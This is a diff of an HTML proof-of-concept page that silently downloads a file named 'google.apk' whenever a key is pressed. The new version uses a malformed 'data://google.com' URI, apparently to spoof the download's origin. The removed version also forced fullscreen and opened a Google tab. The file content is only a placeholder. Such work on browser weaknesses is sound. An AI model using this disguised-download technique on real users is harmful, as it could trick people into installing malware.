@@ -1,21 +1,23 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>Download & Fullscreen on Keypress</title>
 </head>
 <body>
-  <center><h2>POC Modified</h2></center>
+  <center><h2>POC!</h2></center>
 
   <script>
-    // Trigger on any key press
-    window.addEventListener("keydown", function () {
-      startDownload();
-      requestFullScreen();
+    // Listen to any keydown
+    window.addEventListener('keydown', function(e) {
+      // open the download
+      openWin();
+      // request fullscreen
+      //goFullScreen();
     });
 
-    // File downloader
-    function triggerDownload(uri, name) {
+    // Download helper
+    function Puf(uri, name) {
       const link = document.createElement("a");
       link.href = uri;
       link.download = name;
@@ -24,31 +26,17 @@
       document.body.removeChild(link);
     }
 
-    // Start download with a proper data URI
-    function startDownload() {
-      const fileData = "ZXN0dGVzdGVzdHRlc3Q="; // base64 content
-      const dataURI = `data:application/octet-stream;base64,${fileData}`;
-      triggerDownload(dataURI, "google.apk");
+    // Kick off your “APK” download
+    function openWin() {
+      Puf(
+        "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
+        "google.apk"
+      );
     }
 
-    // Request fullscreen
-    function requestFullScreen() {
-      const elem = document.documentElement;
-      if (elem.requestFullscreen) elem.requestFullscreen();
-      else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-      else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
-    }
-      // Open splash new tab (Google/Chrome)
-    function openSplashTab() {
-      window.open("https://www.google.com", "_blank");
-    }
-
-    // Modify event: download + fullscreen + splash tab
-    window.addEventListener("keydown", function () {
-      startDownload();
-      requestFullScreen();
-      openSplashTab();
-    });
   </script>
+  
+
+  
 </body>
 </html>
